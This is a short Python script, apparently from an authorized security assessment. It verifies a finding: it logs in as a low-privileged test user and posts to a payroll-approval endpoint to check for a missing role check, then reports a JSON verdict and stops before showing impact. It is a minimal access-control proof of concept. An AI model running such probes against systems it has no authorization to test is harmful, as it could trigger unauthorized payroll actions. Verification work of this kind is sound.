#!/usr/bin/python3
"""
Script to discover and verify finding DISCOVERED-001.
"""

import argparse
import json
import requests
import sys


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, help="Target URL")
    args = parser.parse_args()

    target = args.target.rstrip('/')
    session = requests.Session()

    user_a = "test-user-a"
    pass_a = "HalcyonTestA!"

    verdict = "unconfirmed"
    evidence = {
        "flaw": "role check missing on a state-changing action",
        "proof": "unknown"
    }

    try:
        # Authenticate as a low-privileged member
        session.post(
            f"{target}/login",
            data={"username": user_a, "password": pass_a},
            timeout=5
        )

        # Test a state-changing endpoint lacking proper authorization
        # Using the payroll endpoint mentioned in the engagement brief
        action_url = f"{target}/api/v1/payroll/approve"
        req = session.post(action_url, json={"id": 1041}, timeout=5)

        # If the application permits the action for a non-admin
        if req.status_code in [200, 201]:
            verdict = "confirmed"
            evidence["proof"] = "minimal reproducible request sequence"
        elif req.status_code in [401, 403]:
            verdict = "false_positive"
            evidence["proof"] = "Action appropriately denied"
        else:
            evidence["proof"] = f"Unexpected response: HTTP {req.status_code}"

    except requests.RequestException as e:
        sys.stderr.write(f"Request failed: {e}\n")
        sys.exit(1)

    stop_msg = "flaw proven present; impact not demonstrated"

    result = {
        "finding": "DISCOVERED-001",
        "class": "business_logic_access_control",
        "verdict": verdict,
        "evidence": evidence,
        "stopped_at": stop_msg
    }

    if verdict == "unconfirmed":
        result["to_settle"] = "Verify specific endpoint behavior manually."

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
